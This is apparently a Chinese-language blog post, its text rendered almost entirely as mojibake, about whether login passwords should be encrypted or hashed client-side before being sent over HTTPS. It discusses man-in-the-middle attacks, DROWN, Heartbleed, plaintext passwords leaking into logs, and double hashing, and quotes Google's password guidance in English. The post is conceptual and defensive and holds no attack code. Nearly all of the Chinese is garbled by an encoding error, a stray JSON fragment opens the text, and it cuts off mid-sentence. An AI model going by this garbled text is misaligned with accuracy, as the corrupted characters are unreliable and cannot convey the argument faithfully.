åŸ·è¡Œ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næœ€è¿‘æœ‰äººåœ¨è‡‰æ›¸å‰ç«¯äº¤æµç¤¾ç¾¤ç™¼äº†ä¸€å‰‡è²¼æ–‡ï¼Œå…§å®¹æ˜¯ä»–çœ‹åˆ°äº†ä¸€å€‹å•é¡Œï¼šè«‹å•ç™»å…¥apiå‚³è³¬è™Ÿã€å¯†ç¢¼jsonæ˜ç¢¼æœƒæœ‰å•é¡Œå—?ï¼Œæƒ³çŸ¥é“å¤§å®¶å°é€™å€‹å•é¡Œçš„çœ‹æ³•ã€‚\nè€Œåº•ä¸‹çš„å›ç­”å¤§éƒ¨ä»½éƒ½æ˜¯è¦ºå¾—ã€Œæœ‰ç”¨ HTTPS å°±å¥½äº†ï¼Œæ²’å¿…è¦é¡å¤–å†å¯¦ä½œä¸€å±¤åŠ å¯†ï¼Œæ²’æœ‰ä»€éº¼å¤ªå¤§çš„æ„ç¾©ã€.\nè€å¯¦èªªæˆ‘ä»¥å‰ä¹Ÿæ˜¯é€™æ¨£èªç‚ºçš„ï¼Œè€Œä¸”éå»åœ¨ç¤¾ç¾¤ä¸­å°±æœ‰å‡ºç¾éé¡ä¼¼çš„è¨è«–ã€‚æˆ‘é‚£æ™‚å€™æƒ³èªªéƒ½å·²ç¶“æœ‰ HTTPS äº†ï¼Œè€Œ HTTPS æœ¬èº«çš„ç›®çš„å°±æ˜¯ç‚ºäº†ä¿éšœå‚³è¼¸çš„å®‰å…¨ï¼Œç‚ºä»€éº¼è¦è‡ªå·±å†åšåŠ å¯†ï¼Ÿ\nä½†é€™ä¸€å…©å¹´æ¥è§¸è³‡å®‰ä»¥å¾Œï¼Œæˆ‘çš„æƒ³æ³•æœ‰äº†æ”¹è®Šï¼Œæˆ‘èªç‚ºå‰ç«¯åœ¨å‚³è¼¸å‰æŠŠå¯†ç¢¼åŠ å¯†ï¼Œæ˜¯æœ‰å…¶æ„ç¾©çš„ï¼Œè€Œæ¥ä¸‹ä¾†æˆ‘æœƒè©³ç´°èªªæ˜æˆ‘çš„ç†ç”±ã€‚\nå®šç¾©å•é¡Œ åœ¨é€²å…¥æ­£é¡Œä¹‹å‰ï¼Œæˆ‘æƒ³æŠŠå•é¡Œå®šç¾©å¾—æ›´æ˜ç¢ºä¸€é»ï¼Œå…å¾—å‡ºç¾ä¸€å †å¼µé£›æ‰“å²³é£›ï¼Œæ‹¿å…©å€‹å®Œå…¨ä¸åŒçš„æƒ…å¢ƒä¾†æ¯”è¼ƒçš„ç‹€æ³ã€‚åœ¨åŸæ–‡åº•ä¸‹ï¼Œå°±æœ‰ä¸å°‘ç•™è¨€åœ¨è¨è«–çš„æ˜¯ä¸åŒçš„å•é¡Œï¼ŒæŠŠå•é¡Œå…ˆå®šç¾©æ¸…æ¥šæ»¿é‡è¦çš„ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘è¦æ¯”è¼ƒçš„å°è±¡æ˜¯ï¼š\nåœ¨ä½¿ç”¨ HTTPS çš„å‰æä¸‹ï¼Œæ‰“ç™»å…¥ API æ™‚ä¸åšä»»ä½•äº‹ç›´æ¥å‚³é€å¯†ç¢¼çš„æ˜æ–‡ åœ¨ä½¿ç”¨ HTTPS çš„å‰æä¸‹ï¼Œæ‰“ç™»å…¥ API æ™‚å…ˆæŠŠå¯†ç¢¼åŠ å¯†ï¼Œå†å‚³é€åˆ° server é€™é‚Šéœ€è¦æ³¨æ„çš„æ˜¯ã€Œå…©å€‹ç‹€æ³éƒ½æ˜¯ HTTPSã€ï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³è¬›çš„æ˜¯ã€Œæ²’å¿…è¦è‡ªå·±ç™¼æ˜æ–°æŠ€è¡“ã€æˆ–æ˜¯ã€Œè‡ªå·±ç™¼æ˜æ–°çš„åŠ å¯†æ–¹å¼ä¸æœƒæ¯”è¼ƒå®‰å…¨ã€ç­‰ç­‰ï¼Œåœ¨é€™å€‹å‰æä¸‹å…¨éƒ½ä¸é©ç”¨ã€‚\nå› ç‚ºå‚³è¼¸å±¤é‚„æ˜¯é  HTTPS åœ¨å‚³è¼¸ï¼Œæ‰€ä»¥åœ¨é€™å€‹éšæ®µä¸¦æ²’æœ‰è‡ªå·±ç™¼æ˜æ–°çš„æ–¹å¼ï¼Œæˆ‘åªæ˜¯åœ¨æ‡‰ç”¨å±¤è‡ªå·±æŠŠå‚³è¼¸çš„è³‡æ–™é¡å¤–åŠ å¯†ä¸€å±¤è€Œå·²ã€‚\nå†ä¾†ï¼Œå…ˆä¸è€ƒæ…®æˆæœ¬é€™ä»¶äº‹ï¼Œç´”ç²¹åªå¾æŠ€è¡“çš„è§’åº¦å»çœ‹å¯èƒ½æœ‰å“ªäº›å„ªç¼ºé»(æˆæœ¬ç›¸é—œçš„æœ€å¾Œå†ä¾†è¨è«–)ã€‚\næœ€å¾Œå‘¢ï¼Œæˆ‘é€™é‚Šçš„æƒ…å¢ƒæ˜¯ã€ŒåŠ å¯†å¯†ç¢¼ã€è€Œé hashï¼Œé€™æ˜¯å› ç‚ºæˆ‘è¦ºå¾— hash çš„ç‹€æ³æ¯”è¼ƒè¤‡é›œï¼Œæˆ‘è‡ªå·±æƒ³å…ˆç”¨åŠ å¯†ä¾†èˆ‰ä¾‹ï¼Œè€Œä¸”é€™å€‹åŠ å¯†æ˜¯ã€Œéå°ç¨±å¼åŠ å¯†ã€ã€‚\nä¹Ÿå°±æ˜¯æˆ‘å€‘å¯ä»¥æƒ³åƒå·²ç¶“æœ‰ä¸€æŠŠ public key å­˜åœ¨æ–¼ client ç«¯(ç•¶ç„¶ï¼Œæ¯å€‹äººéƒ½å¯ä»¥æ‹¿å¾—åˆ°)ï¼Œåœ¨é€å‡º request ä»¥å‰ï¼Œæœƒå…ˆä½¿ç”¨ JavaScript æŠŠå¯†ç¢¼ç”¨ public key åŠ å¯†ä»¥å¾Œå†é€å‡ºï¼Œè€Œ server ä½¿ç”¨ private key è§£å¯†ï¼Œæ‹¿åˆ°å¯†ç¢¼ä»¥å¾Œ hash éå†å­˜å…¥è³‡æ–™åº«ä¸­ã€‚\nç¶œåˆä»¥ä¸Šï¼Œé€™ç¯‡æƒ³è™•ç†çš„å•é¡Œæ˜¯ï¼šã€Œå·²ç¶“ä½¿ç”¨äº† HTTPSï¼Œåœ¨æ‰“ç™»å…¥ API ä»¥å‰å…ˆæŠŠå¯†ç¢¼åŠ å¯†éæˆ–æ˜¯ä¸åšä»»ä½•è™•ç†ï¼Œé€™å…©è€…çš„å·®åˆ¥åœ¨å“ªï¼Ÿã€\nè€Œæˆ‘å€‘å¯ä»¥æŠŠå›ç­”åˆ†æˆå…©å€‹éƒ¨åˆ†ï¼š\nå‡è¨­ HTTPS è¢«ç ´è§£äº†ï¼Œæ˜¯ä¸å®‰å…¨çš„ï¼Œå·®åœ¨å“ªï¼Ÿ å‡è¨­ HTTPS æ˜¯å®‰å…¨çš„ï¼Œå·®åœ¨å“ªï¼Ÿ å‡è¨­ HTTPS ä¸å®‰å…¨ï¼Œå·®åœ¨å“ªï¼Ÿ é¦–å…ˆï¼Œå¯ä»¥å…ˆæƒ³ä¸€ä¸‹æ€æ¨£çš„ç‹€æ³æœƒé€ æˆ HTTPS ä¸å®‰å…¨ï¼Œæ”»æ“Šè€…æŒæ¡äº†ç³»çµ±çš„å“ªäº›éƒ¨åˆ†ï¼Ÿ\nåº•ä¸‹ç°¡å–®åˆ†ç‚ºå››ç¨®ç‹€æ³è¨è«–ï¼š\næ”»æ“Šè€…æŒæ§æ•´å°é›»è…¦ï¼Œä¿¡ä»»æƒ¡æ„æ†‘è­‰ æ”»æ“Šè€…æˆåŠŸåŸ·è¡Œäº†ä¸­é–“äººæ”»æ“Š æ”»æ“Šè€…å¯ä»¥åœ¨ç¶²è·¯å±¤ç›£è½ request ä¸¦ä½¿ç”¨æ¼æ´å–å¾—æ˜æ–‡ æ”»æ“Šè€…ç›´æ¥é‡å° HTTPS server é€²è¡Œæ”»æ“Š æ”»æ“Šè€…æŒæ§æ•´å°é›»è…¦ï¼Œä¿¡ä»»æƒ¡æ„æ†‘è­‰ è‹¥æ˜¯é€™ç¨®é¡å‹çš„ç‹€æ³ï¼Œé‚£ç•¶ç„¶æ˜¯æœ‰æ²’æœ‰åŠ å¯†éƒ½æ²’å·®ï¼Œå› ç‚ºæ”»æ“Šè€…éƒ½æœ‰å…¶ä»–æ›´å¥½çš„æ‰‹æ®µå»å–å¾—ä½ çš„å¯†ç¢¼ã€‚\næ”»æ“Šè€…æˆåŠŸåŸ·è¡Œäº†ä¸­é–“äººæ”»æ“Š é‚£å¦‚æœæ˜¯ã€Œæ”»æ“Šè€…æˆåŠŸåŸ·è¡Œäº†ä¸­é–“äººæ”»æ“Šï¼ˆMan-In-The-Middleï¼‰ã€å‘¢ï¼Ÿä½ çš„é›»è…¦æ²’äº‹ï¼Œåªæ˜¯å°åŒ…åœ¨å‚³è¼¸çš„éç¨‹ä¸­è¢«ä¸­é–“äººæ”»æ“Šã€‚\nåœ¨é€™æ¨£çš„å‰æåº•ä¸‹ï¼Œæ²’åŠ å¯†çš„æƒ…å½¢å°±èƒ½ç›´æ¥è¢«ç²å–å¯†ç¢¼ï¼Œè€Œæœ‰åŠ å¯†çš„æƒ…å½¢æ”»æ“Šè€…åªèƒ½ç²å–åˆ°åŠ å¯†éçš„å¯†æ–‡è€Œéæ˜æ–‡ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯æ—¢ç„¶æ˜¯å«ä¸­é–“äººæ”»æ“Šï¼Œé‚£æ”»æ“Šè€…é™¤äº†ç›£è½ä½ çš„ request ä»¥å¤–ï¼Œä¹Ÿèƒ½å‚³é€å½é€ çš„ response çµ¦ä½ ï¼ŒæŠŠå‰ç«¯ç”¨ä¾†åŠ å¯†å¯†ç¢¼çš„éƒ¨åˆ†æ›æ‰ã€‚\nå› æ­¤ç„¡è«–å¯†ç¢¼æ˜¯å¦åŠ å¯†ï¼Œæ”»æ“Šè€…éƒ½å¯ä»¥æ‹¿åˆ°æ˜æ–‡ï¼Œåªæ˜¯å¦‚æœæœ‰åŠ å¯†çš„è©±ï¼Œæ”»æ“Šè€…å–å¾—å¯†ç¢¼çš„æˆæœ¬è¼ƒé«˜ï¼ˆéœ€è¦å…ˆæ‰¾åˆ°åœ¨å“ªé‚ŠåŠ å¯†çš„ï¼Œç„¶å¾ŒæŠŠé‚£æ®µæ”¹æ‰ï¼‰ã€‚\næ”»æ“Šè€…å¯ä»¥åœ¨ç¶²è·¯å±¤ç›£è½ request ä¸¦ä½¿ç”¨æ¼æ´å–å¾—æ˜æ–‡ é€™å€‹ç‹€æ³è·Ÿä¸Šä¸€å€‹çš„ä¸åŒä¹‹è™•åœ¨æ–¼é€™å€‹åªèƒ½è®€ï¼Œä¸èƒ½å¯«ã€‚è‹¥æ˜¯æœ‰è¾¦æ³•è§£å¯† request çš„å°åŒ…ï¼Œå°±èƒ½å¤ çœ‹åˆ°æ˜æ–‡ã€‚\næ‰€ä»¥å¦‚æœæœ‰æŠŠå¯†ç¢¼å…ˆåŠ å¯†ï¼Œæ”»æ“Šè€…å°±ç„¡æ³•å–å¾—å¯†ç¢¼çš„æ˜æ–‡ã€‚\né€™é‚Šéœ€è¦æ³¨æ„çš„æ˜¯å„˜ç®¡ç„¡æ³•å–å¾—æ˜æ–‡ï¼Œæ”»æ“Šè€…ä¾ç„¶å¯ä»¥é€éé‡é€è«‹æ±‚ä¾†ç™»å…¥ä½ çš„å¸³è™Ÿï¼ˆå…ˆå‡è¨­æ²’æœ‰å…¶ä»–æ©Ÿåˆ¶ï¼‰ï¼Œæ‰€ä»¥ä½ å¸³è™Ÿé‚„æ˜¯è¢«ç›œäº†ï¼Œåªæ˜¯æ”»æ“Šè€…ä¸çŸ¥é“ä½ çš„å¯†ç¢¼æ˜æ–‡ã€‚\né€™æœ‰å·®å—ï¼Ÿæœ‰ï¼\nå‡è¨­ä»–çŸ¥é“äº†ä½ çš„å¯†ç¢¼æ˜æ–‡ï¼Œå°±å¯ä»¥æ‹¿ä½ çš„é€™çµ„å¸³è™Ÿå¯†ç¢¼å»å„å€‹æœå‹™éƒ½è©¦è©¦çœ‹ï¼Œè‹¥æ˜¯ä½ å…¶ä»–ç¶²ç«™ä¹Ÿç”¨åŒä¸€çµ„å¸³è™Ÿå¯†ç¢¼ï¼Œå°±æœƒè·Ÿè‘—æ·ªé™·ï¼ˆä¿—ç¨±çš„æ’åº«æ”»æ“Šï¼‰ã€‚\nå› æ­¤åœ¨é€™å€‹ç‹€æ³åº•ä¸‹ï¼ŒåŠ å¯†å¯†ç¢¼çš„å®‰å…¨æ€§é¡¯ç„¶æ˜¯æ›´é«˜çš„ã€‚\næ­¤æ™‚ä½ å¯èƒ½æœƒæƒ³å•çš„å•é¡Œæ˜¯ï¼šã€Œé‚£åœ¨ä»€éº¼ç‹€æ³ä¸‹æ”»æ“Šè€…èƒ½å¤ å–å¾— HTTPS çš„æ˜æ–‡ï¼ŸçœŸçš„æœ‰å¯èƒ½å—ï¼Ÿã€\né€™é‚Šæœ‰ä¸€ä»½ç¾åœ‹è¡›ç”ŸåŠå…¬å…±æœå‹™éƒ¨ HHS æ‰€åšçš„ç°¡å ±ï¼šSSL/TLS Vulnerabilitiesï¼Œè£¡é¢æœ‰è¨˜éŒ„ä¸€äº› SSL/TLS æ›¾ç¶“æœ‰éçš„æ¼æ´ï¼Œæ‰€ä»¥å–å¾— HTTPS çš„æ˜æ–‡ç¢ºå¯¦æ˜¯æœ‰å¯èƒ½çš„ã€‚\nä¸éå…‰æ˜¯çŸ¥é“ã€Œæœ‰å¯èƒ½ã€æ˜¯ä¸å¤ çš„ï¼Œæ‡‰è©²å•çš„æ˜¯ã€Œæ©Ÿç‡é«˜å—ï¼Ÿã€ï¼Œåœ¨è¨è«–é¢¨éšªçš„æ™‚å€™ï¼Œé€šå¸¸ä¹Ÿæœƒæ ¹æ“šé¢¨éšªçš„é«˜ä½ä»¥åŠåš´é‡ç¨‹åº¦ä¾†æ±ºå®šè©²æ€éº¼è™•ç†é€™å€‹é¢¨éšªã€‚\nç­”æ¡ˆæ˜¯ã€Œæ©Ÿç‡å¾ˆä½ã€ï¼Œç°¡å ±è£¡çš„æ¼æ´æœ€è¿‘çš„å·²ç¶“æ˜¯ 2017 å¹´çš„äº‹æƒ…äº†ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨ä¸€äº›èˆŠçš„ã€æœ‰å•é¡Œçš„åŠ å¯†æ¼”ç®—æ³•ï¼Œé™¤æ­¤ä¹‹å¤–é‚„éœ€è¦ç¬¦åˆä¸å°‘å…¶ä»–æ¢ä»¶ï¼Œæ‰èƒ½åŸ·è¡Œæ”»æ“Šï¼Œæ‰€ä»¥æˆ‘èªç‚ºæ©Ÿç‡ç¢ºå¯¦æ˜¯å¾ˆä½çš„ã€‚\nä»¥ 2016 å¹´ç™¼è¡¨çš„ DROWN(Decrypting RSA with Obsolete and Weakened eNcryption) ä¾†èªªï¼ŒServer è¦æ”¯æ´ SSLv2ï¼Œè€Œæ”»æ“Šè€…è¦èƒ½æŠ“åˆ°åŠ å¯†éçš„ TLS connectionï¼Œç¬¦åˆé€™äº›æ¢ä»¶ä»¥å¾Œï¼Œé€²è¡Œä¸€å¤§å †é‹ç®—å¾Œå°±å¯ä»¥è§£é–‹ 900 å€‹ connection ä¸­çš„ 1 å€‹ï¼Œè€Œé‹ç®—æˆæœ¬åœ¨ç•¶æ™‚æ˜¯ 440 ç¾é‡‘ï¼Œç´„ 13k å°å¹£ã€‚\nç¸½ä¹‹å‘¢ï¼Œé‡å°é€™å€‹ç‹€æ³ï¼Œæˆ‘å€‘å¯ä»¥èªªï¼š\nå‡è¨­æ”»æ“Šè€…å¯ä»¥å–å¾— HTTPS çš„æ˜æ–‡ï¼Œé‚£ç¢ºå¯¦è‡ªå·±åœ¨æ‡‰ç”¨å±¤åŠ å¯†æœƒæ›´å®‰å…¨ï¼Œä½†è¦ç¬¦åˆé€™å€‹å‡è¨­çš„æˆæœ¬å¾ˆé«˜ï¼Œç™¼ç”Ÿæ©Ÿç‡å¾ˆä½\næ”»æ“Šè€…ç›´æ¥é‡å° HTTPS server é€²è¡Œæ”»æ“Š é€™å€‹åˆ†é¡æˆ‘æŒ‡çš„æ˜¯åœ¨ 2014 å¹´ç™¼ç”Ÿéçš„ Heartbleed æ¼æ´ï¼Œæ”»æ“Šè€…å¯ä»¥è—‰ç”± OpenSSL çš„æ¼æ´è®€å–åˆ° server çš„è¨˜æ†¶é«”ã€‚\né€™å€‹ç‹€æ³è·Ÿä¸Šä¸€å€‹æ»¿åƒçš„ï¼Œå¦‚æœæœ‰åœ¨ client ç«¯å…ˆåŠ å¯†éå¯†ç¢¼ï¼Œé‚£æ”»æ“Šè€…åœ¨ server ä¸Šè®€åˆ°çš„å°±æ˜¯åŠ å¯†éå¾Œçš„ï¼Œä¸çŸ¥é“å¯†ç¢¼æ˜æ–‡æ˜¯ä»€éº¼ã€‚\næ‰€ä»¥çµè«–è·Ÿä¸Šå€‹ä¸€æ¨£ï¼Œå°±æ˜¯åŠ å¯†å¯†ç¢¼æœƒæ›´å®‰å…¨ã€‚\nä¸­å ´ç¸½çµ å‰›å‰›æˆ‘å€‘è¨è«–äº†å¹¾ç¨®ã€ŒHTTPS è®Šå¾—ä¸å®‰å…¨ã€çš„ç‹€æ³ï¼Œå¾ä»¥å¾€ç™¼ç”Ÿéçš„æ¡ˆä¾‹å¯ä»¥å¾—çŸ¥ã€ŒHTTPS è®Šå¾—ä¸å®‰å…¨ã€æ˜¯æœ‰å¯èƒ½çš„ã€‚è‹¥æ˜¯æ”»æ“Šè€…èƒ½å¤ è®€åˆ° HTTPS å‚³è¼¸çš„æ˜æ–‡ï¼Œé‚£åœ¨æ‡‰ç”¨å±¤å°‡å¯†ç¢¼åŠ å¯†ï¼Œå°±èƒ½é˜²æ­¢æ”»æ“Šè€…å–å¾—å¯†ç¢¼çš„æ˜æ–‡ï¼Œå› æ­¤æœƒæ¯”æ²’æœ‰åŠ å¯†ä¾†å¾—æ›´å®‰å…¨ã€‚\nå¦‚æœè¦è¬›å¾—æ›´è©³ç´°ï¼Œå¯ä»¥å¾å…©å€‹ç¶­åº¦å»åˆ‡å…¥ï¼Œä¸€å€‹æ˜¯åš´é‡æ€§ï¼ˆseverityï¼‰ï¼Œå¦ä¸€å€‹æ˜¯å¯èƒ½æ€§ï¼ˆpossibilityï¼‰ã€‚\nä»¥åš´é‡æ€§ä¾†èªªï¼Œä¸ç®¡æœ‰æ²’æœ‰åŠ å¯†å¯†ç¢¼ï¼Œåªè¦æ”»æ“Šè€…æœ‰è¾¦æ³•æ‹¿åˆ° request çš„å…§å®¹ï¼Œä½ çš„å¸³è™Ÿå°±å·²ç¶“æ·ªé™·äº†ï¼Œè€Œæœ‰æ²’æœ‰åŠ å¯†å”¯ä¸€çš„å·®åˆ¥åªæœ‰æ”»æ“Šè€…æ˜¯å¦èƒ½å–å¾—æ˜æ–‡å¯†ç¢¼ï¼Œæœ‰çš„è©±å°±å¯ä»¥åŸ·è¡Œæ’åº«æ”»æ“Šï¼Œæ‹¿å¯†ç¢¼å»è©¦æ›´å¤šå…¶ä»–çš„ç¶²ç«™ã€‚\nè€Œå¯èƒ½æ€§å°±æ˜¯ã€ŒHTTPS çš„æ˜æ–‡è¢«æ‹¿åˆ°ã€é€™ä»¶äº‹çš„å¯èƒ½æ€§ï¼Œå¾éå¾€çš„ç¶“æ­·ä»¥åŠç ”ç©¶ä¾†çœ‹ï¼Œé›–ç„¶æ˜¯æœ‰å¯èƒ½çš„ï¼Œä½†åœ¨ 2023 å¹´çš„ä»Šå¤©ï¼Œæ©Ÿç‡æ˜¯å¾ˆä½çš„ã€‚\nå› æ­¤æˆ‘å€‘ç¾éšæ®µçš„çµè«–æ‡‰è©²æ˜¯ï¼š\næ”»æ“Šè€…è‹¥æ˜¯å¯ä»¥ç¹é HTTPS æ‹¿åˆ°æ˜æ–‡çš„ requestï¼Œé‚£åœ¨æ‡‰ç”¨å±¤å°‡å¯†ç¢¼åŠ å¯†ï¼Œç¢ºå¯¦æœƒæ¯”è¼ƒå®‰å…¨ï¼Œä½†è¦æ³¨æ„çš„æ˜¯è¦é”æˆé€™å€‹å‰æéå¸¸å›°é›£ï¼Œç™¼ç”Ÿçš„æ©Ÿç‡æ¥µä½ã€‚\nå‡è¨­ HTTPS æ˜¯å®‰å…¨çš„ æ¥ä¸‹ä¾†æˆ‘å€‘è¨è«–ç¬¬äºŒç¨®ç‹€æ³ï¼Œé‚£å°±æ˜¯å‡è¨­ HTTPS æ˜¯å®‰å…¨çš„ï¼Œæ²’æœ‰ä»»ä½•äººå¯ä»¥å¾ä¸­é–“çœ‹åˆ°æ˜æ–‡çš„å…§å®¹ï¼Œé€™æ‡‰è©²ä¹Ÿæ˜¯ç•™è¨€å€ä¸­å¤§å¤šæ•¸äººå‡è¨­çš„å‰æã€‚\nåœ¨é€™ç¨®ç‹€æ³ä¸‹ï¼Œæœƒæœ‰å“ªäº›é¢¨éšªå‘¢ï¼Ÿ\næœ‰ä¸€å€‹ç¾å¯¦ç”Ÿæ´»ä¸­æœƒç™¼ç”Ÿï¼Œè€Œä¸”ä¹Ÿç¢ºå¯¦ç™¼ç”Ÿéçš„é¢¨éšªï¼Œé‚£å°±æ˜¯ loggingã€‚\nèº«ç‚ºå‰ç«¯å·¥ç¨‹å¸«ï¼Œåœ¨å‰ç«¯åŠ è£ä¸€äº› error tracking çš„æœå‹™æ˜¯å¾ˆåˆç†çš„äº‹æƒ…ï¼Œè‹¥æ˜¯æˆ‘å€‘ç›´æ¥å¯¦ä½œä¸€å€‹ã€Œåªè¦ä¼ºæœå™¨å›å‚³ 5xxï¼Œå°±æŠŠ request è¨˜éŒ„èµ·ä¾†ã€çš„æ©Ÿåˆ¶ï¼Œå¦‚æœå¥½å·§ä¸å·§å“ªå¤©ç™»å…¥çš„ API å‡ºç¾é€™å€‹ç‹€æ³ï¼Œä½ å°±å¯ä»¥åœ¨ log è£¡é¢çœ‹åˆ°ä½¿ç”¨è€…çš„æ˜æ–‡å¯†ç¢¼ã€‚\nè€Œä¸”ä¸åªå‰ç«¯ï¼Œå¾Œç«¯ä¹Ÿå¯èƒ½æœ‰é¡ä¼¼çš„æ©Ÿåˆ¶ï¼Œç¢°åˆ°ä¸€äº›å•é¡Œå°±æŠŠ request æ•´å€‹å¯«åˆ° log æª”å»ï¼Œæ–¹ä¾¿ä»¥å¾ŒæŸ¥çœ‹ä»¥åŠ debugï¼Œä¸€ä¸å°å¿ƒå¯†ç¢¼å°±å¯èƒ½è¢«å¯«é€²å»ã€‚\nåœ¨é€™ç¨®ç‹€æ³ä¸‹ï¼Œåœ¨ client ç«¯å…ˆæŠŠå¯†ç¢¼åŠ å¯†é¡¯ç„¶æ˜¯æœ‰å¥½è™•çš„ï¼Œé‚£å°±æ˜¯åœ¨é€™äº›éŒ¯èª¤è™•ç†çš„ log ä¸­ï¼Œè¢«è¨˜éŒ„ä¸‹ä¾†çš„å¯†ç¢¼æœƒæ˜¯å¯†æ–‡ï¼Œé™¤éä½ æœ‰å¯†é‘°ï¼Œå¦å‰‡ä½ æ˜¯ä¸æœƒçŸ¥é“ä½¿ç”¨è€…çš„å¯†ç¢¼çš„ã€‚\næˆ‘åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°ä¸€ç¯‡è·Ÿæˆ‘è«–é»ä¸€æ¨£çš„æ–‡ç« ï¼šThe case for client-side hashing: logging passwords by mistakeï¼Œè£¡é¢æœ‰é™„ä¸Šå¾ˆå¤šåƒè€ƒé€£çµï¼Œéƒ½æ˜¯ä»¥å‰å„å¤§å…¬å¸ä¸å°å¿ƒæŠŠå¯†ç¢¼çš„æ˜æ–‡è¨˜éŒ„ä¸‹ä¾†çš„æ¡ˆä¾‹ã€‚\nç„¶å¾Œæœ‰å€‹å°åœ°æ–¹ç¨å¾®è¬›ä¸€ä¸‹ï¼Œä¸Šé¢é€™ç¯‡åšçš„æ˜¯ã€Œåœ¨ client ç«¯ hashã€ï¼Œè·Ÿæˆ‘é€™ç¯‡ä¸€é–‹å§‹è¨­å®šçš„ã€Œåœ¨ client ç«¯åšéå°ç¨±å¼åŠ å¯†ã€æœ‰é»ä¸åŒï¼Œhash æœƒæ›´å®‰å…¨ä¸€é»ï¼Œç¢ºä¿åœ¨ server çœŸçš„æ²’äººçŸ¥é“ä½ çš„å¯†ç¢¼æ˜æ–‡æ˜¯ä»€éº¼ã€‚\nç¸½ä¹‹å‘¢ï¼Œåœ¨ client ç«¯å…ˆæŠŠå¯†ç¢¼åŠ å¯†æˆ–æ˜¯ hashï¼Œå¯ä»¥é¿å…åœ¨æ—¥èªŒä¸­ä¸å°å¿ƒå‡ºç¾ä½¿ç”¨è€…çš„å¯†ç¢¼æ˜æ–‡ï¼Œé€™å€‹é¡¯ç„¶æ˜¯å€‹é¡å¤–çš„å„ªé»ã€‚\nåŠ å¯†é‚„æ˜¯ hashï¼Ÿ æ–‡ç« é–‹é ­æˆ‘æœ‰æåˆ° hash çš„ç‹€æ³æœ‰äº›è¤‡é›œï¼Œæ‰€ä»¥æˆ‘å…ˆæŠŠæƒ…å¢ƒè¨­å®šåœ¨ã€Œå°å¯†ç¢¼åšéå°ç¨±å¼åŠ å¯†ã€å†å‚³è¼¸ï¼Œå› ç‚ºå°ä¸Šé¢æˆ‘èˆ‰çš„é‚£äº›ä¾‹å­è€Œè¨€ï¼Œé€™å…©ç¨®æƒ…å¢ƒçš„å·®ç•°ä¸å¤§ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼ŒHTTPS è¢«æ‹¿åˆ°æ˜æ–‡å…§å®¹ï¼Œç„¡è«–ä½ å°å¯†ç¢¼åšäº†éå°ç¨±å¼åŠ å¯†é‚„æ˜¯é›œæ¹Šï¼Œåœ¨æ”»æ“Šè€…ç„¡æ³•å–å¾—ä¼ºæœå™¨ç«¯å¯†é‘°çš„å‰æä¹‹ä¸‹ï¼Œéƒ½æ˜¯æ‹¿ä¸åˆ°æ˜æ–‡å¯†ç¢¼çš„ã€‚\né‚£ç‚ºä»€éº¼ hash çš„ç‹€æ³æœ‰äº›è¤‡é›œå‘¢ï¼Ÿ\nå‡è¨­æˆ‘å€‘åœ¨å‰ç«¯å…ˆæŠŠå¯†ç¢¼ hash éå¾Œå†å‚³åˆ°å¾Œç«¯ï¼Œé‚£å¾Œç«¯æ˜¯è¦ç›´æ¥å­˜é€²å»è³‡æ–™åº«å—ï¼Ÿå¦‚æœç›´æ¥å­˜é€²å»è³‡æ–™åº«ï¼Œå“ªå¤©è³‡æ–™åº«çš„å…§å®¹æ›å…‰ï¼Œæ”»æ“Šè€…å°±æ‹¿åˆ°é€™äº› hash éçš„å¯†ç¢¼äº†ã€‚\né€šå¸¸åœ¨æœ‰åŠ é¹½ä»¥åŠé›œæ¹Šæ¼”ç®—æ³•å¤ å¼·çš„å‰æä¹‹ä¸‹ï¼Œè¢«æ‹¿åˆ° hash çš„å¯†ç¢¼é‚„æ˜¯èƒ½ä¿è­‰ä¸€å®šçš„å®‰å…¨æ€§ï¼Œå¯æ˜¯åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œåè€Œè®Šå¾—å¾ˆä¸å®‰å…¨ã€‚\nå› ç‚ºå‰ç«¯å‚³çµ¦å¾Œç«¯çš„å…§å®¹å·²ç¶“æ˜¯ hash éçš„äº†ï¼Œæ‰€ä»¥æ”»æ“Šè€…å¯ä»¥ç›´æ¥æ‹¿ hash éçš„å¯†ç¢¼é€²è¡Œç™»å…¥ï¼Œæ ¹æœ¬ä¸ç”¨çŸ¥é“æ˜æ–‡æ˜¯ä»€éº¼ã€‚é›–ç„¶ä¿è­·äº†æ˜æ–‡ï¼Œä½†å¤±å»äº†åŸæœ¬é›œæ¹Šçš„å®‰å…¨æ€§ã€‚\nå› æ­¤å¦‚æœè¦åš client side hashingï¼Œserver side æ”¶åˆ°å¾Œä¹Ÿè¦å†åšä¸€æ¬¡ã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œå°±ç®—è³‡æ–™åº«è¢«å·èµ°ï¼Œæ”»æ“Šè€…ä¹Ÿæ²’è¾¦æ³•åˆ©ç”¨è³‡æ–™åº«ä¸­çš„ hash ç›´æ¥ç™»å…¥ã€‚\næœ‰äº›äººå¯èƒ½è·Ÿæˆ‘ä¸€æ¨£å¥½å¥‡ï¼šã€Œåšå…©æ¬¡ hash ä¸æœƒæ›´ä¸å®‰å…¨å—ï¼Ÿã€ï¼Œæˆ‘å€‘å¯ä»¥çœ‹ä¸€ä¸‹ Google åœ¨ Modern password security for system designers è£¡é¢æ€éº¼èªªï¼š\nHave the client computer hash the password using a cryptographically secure algorithm and a unique salt provided by the server. When the password is received by the server, hash it again with a different salt that is unknown to the client. Be sure to store both salts securely. If you are using a modern and secure hashing algorithm, repeated hashing does not reduce entropy.\nçœ‹èµ·ä¾†æ˜¯é‚„å¥½ï¼Œå•é¡Œä¸å¤§ã€‚\nç¸½ä¹‹å‘¢ï¼Œçœ‹èµ·ä¾†æœ€å®‰å…¨çš„ä½†ä¹Ÿæ›´è¤‡é›œçš„è§£æ³•å°±æ˜¯ client side å…ˆ hash ä¸€æ¬¡ï¼Œç„¶å¾Œä¸Ÿåˆ° server çš„æ™‚å€™å† hash ä¸€æ¬¡å­˜é€²è³‡æ–™åº«ï¼Œå¦‚æ­¤ä¸€ä¾†å°±å¯ä»¥ä¿è­‰ï¼š\nHTTPS å› 